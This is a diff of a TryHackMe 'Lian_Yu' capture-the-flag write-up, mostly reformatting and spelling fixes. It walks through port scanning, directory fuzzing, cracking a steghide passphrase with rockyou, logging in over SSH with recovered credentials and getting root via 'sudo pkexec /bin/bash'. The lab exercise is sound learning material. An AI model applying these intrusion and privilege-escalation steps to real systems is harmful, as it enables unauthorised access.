@@ -6,16 +6,15 @@ categories:
   - TryHackMe
 ---
 
-<img src="lian-yu.jpeg" alt="lian-yu" width=200/>
+{{< post-img src="lian-yu.jpeg" alt="lian-yu" style="width: 200px;" >}}
 
 ## Enumeration
 
-### nmap
-```
+```bash
 PORT    STATE SERVICE REASON  VERSION
 21/tcp  open  ftp     syn-ack vsftpd 3.0.2
 22/tcp  open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
 | ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T+pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV+d35X8CTUM882eJX+t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs/y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54/tI5s6i4Tfpah2k+fnkLzX74fONcAEqseZDOffn5bxS+nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv+hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A+HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg==
 |   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
@@ -26,11 +25,11 @@ PORT    STATE SERVICE REASON  VERSION
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E/Fn
 80/tcp  open  http    syn-ack Apache httpd
 |_http-server-header: Apache
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Purgatory
 111/tcp open  rpcbind syn-ack 2-4 (RPC #100000)
-| rpcinfo: 
+| rpcinfo:
 |   program version    port/proto  service
 |   100000  2,3,4        111/tcp   rpcbind
 |   100000  2,3,4        111/udp   rpcbind
@@ -43,8 +42,7 @@ PORT    STATE SERVICE REASON  VERSION
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### ffuf
-```
+```bash
 .htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8]
 .htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8]
 island                  [Status: 301, Size: 235, Words: 14, Lines: 8]
@@ -56,13 +54,13 @@ green_arrow             [Status: 200, Size: 71, Words: 10, Lines: 7]
 
 ```
 
-Ha! the author is an arrowverse fan. cool! 
+Ha! the author is an arrowverse fan. cool!
 
 Fuzzing with big.txt only got me one directory "island"
 
 When I visit it there is a hidden "code word" in the source code: `vigilante`
 
-```
+```html
 <!DOCTYPE html>
 <html>
 <body>
@@ -86,13 +84,11 @@ I made a quick list of 4 characters numbers to fuzz faster and got `2100` in isl
 `seq 1000 10000 > numbers.txt`
 
 We need to find a file now. The fuzzing is strong in here!
-
 I tried to fuzz for extensions using this
 
 `ffuf -w /usr/share/wordlists/dirb/extensions_common.txt:FUZZ  -u http://10.10.56.222/island/2100/indexFUZZ`
 
-But only html was accepted, but the file we are looking for is definitelly not html
-
+But only html was accepted, but the file we are looking for is definitely not html
 Then I read source code again
 
 `<!-- you can avail your .ticket here but how?   -->`
@@ -101,20 +97,19 @@ we got our extension...lets fuzz!
 
 found `green_arrow.ticket`
 
-```
+```text
 This is just a token to get into Queen's Gambit(Ship)
 
 RTy8yhBQdscX
 ```
 
 dont be fooled its not base64 its `base58`
-
 cyberchef said the password is : `!#th3h00d`
 
 and we trusted that...we ftp as vigilante
 
-```
-└──╼ $ftp 10.10.56.222                                                                                      
+```bash
+└──╼ $ftp 10.10.56.222
 Connected to 10.10.56.222.
 220 (vsFTPd 3.0.2)
 Name (10.10.56.222:nair0lf32): vigilante
@@ -124,58 +119,48 @@ Password:
 ```
 
 We take everything (and give nothing back)
-
 So we got...files and images
 
-`aa.jpg`  
+`aa.jpg`
 
-<img src="aa.jpg" alt="aa" width=200/>  
-
-
+{{< post-img src="aa.jpg" alt="aa" style="width: 200px;" >}}
 
 
 `Queen's_Gambit.png`
 
-<img src="Queen's_Gambit.png" alt="queensgambit" width=200/>
-
+{{< post-img src="Queen's_Gambit.png" alt="queensgambit" style="width: 200px;" >}}
 
 
 `Leave_me_alone.png`
 
 This file got weird metadata and is acting weird
-
-I will definitelly not leave it alone
-
+I will definitely not leave it alone
 We also got .other_user with a mad long text about `slade` and the rest is not very useful
 
+we all know its steganoraphy but which file?
 
-we all know its steganoraphy but wich file?
-
-```
+```bash
 $steghide --info aa.jpg
 "aa.jpg":
 format: jpeg
 	capacit�: 11,0 KB
 	Essayer d'obtenir des informations � propos des donn�es incorpor�es ? (o/n) o
-	Entrez la passphrase: 
-	
+	Entrez la passphrase:
 ```
 aa.jpg is pretty sus' but we got no passphrase
 
-
 I googled "crack steghide passphrase" XD
-
 found stegCracker a kali tool
 
 `sudo pip install stegcracker`
 
-```
+```bash
 └──╼ $stegcracker aa.jpg /usr/share/wordlists/rockyou.txt
 StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
 Copyright (c) 2021 - Luke Paris (Paradoxis)
 
-StegCracker has been retired following the release of StegSeek, which 
-will blast through the rockyou.txt wordlist within 1.9 second as opposed 
+StegCracker has been retired following the release of StegSeek, which
+will blast through the rockyou.txt wordlist within 1.9 second as opposed
 to StegCracker which takes ~5 hours.
 
 StegSeek can be found at: https://github.com/RickdeJager/stegseek
@@ -186,32 +171,29 @@ Successfully cracked file with password: password
 Tried 68 passwords
 Your file has been written to: aa.jpg.out
 password
-
 ```
 
 that was fast and the password was not even guess-able!
+Anyway...it even already extracted the content for us
+We got `passwd.txt` which is full of text...stuff
 
-Anyway...it even already extrated the content for us
-
-We got `passwd.txt` wich is full of text...stuff
-
-and `shado` that got our password for ssh 
+and `shado` that got our password for ssh
 
 `M3tahuman`
 
 For the username I went with `slade` as its the only one we are sure about
 
-```
+```bash
 └──╼ $ssh slade@10.10.160.96
-slade@10.10.160.96's password: 
+slade@10.10.160.96's password:
                               Way To SSH...
-                          Loading.........Done.. 
+                          Loading.........Done..
                    Connecting To Lian_Yu  Happy Hacking
 
-██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
+██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗
 ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
 ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
-██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
+██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝
 ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
  ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝
 
@@ -226,51 +208,46 @@ slade@10.10.160.96's password:
 ```
 
 I love ascii art so I needed to share it
-
 But I love flags more and I got one right in this folder
 
-```
+```bash
 slade@LianYu:~$ cat user.txt
 THM{Dc_comics_fans_got_arrow}
                         --Felicity Smoak
-
 ```
 
 ## Privilege Escalation
 
-```
+```bash
 slade@LianYu:~$ sudo -l
-[sudo] password for slade: 
+[sudo] password for slade:
 Matching Defaults entries for slade on LianYu:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User slade may run the following commands on LianYu:
     (root) PASSWD: /usr/bin/pkexec
-
 ```
 
 This one is famous lol and very straightforward
-
-pkexec litterally execute commands so just tell him to spawn a shell
-
+pkexec literally execute commands so just tell him to spawn a shell
 As we do it as root its a root shell
 
-```
+```bash
 slade@LianYu:~$ sudo pkexec /bin/bash
 root@LianYu:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Touché! 
-
+Touché!
 now get the root flag
-```
+
+```bash
 root@LianYu:~# cat root.txt
                           Mission accomplished
 
 
 
-You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 
+You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE.
 
 
 
@@ -282,9 +259,4 @@ I will be available @twitter @User6825
 ```
 
 And goodbye!
-
-
-
-
-
 
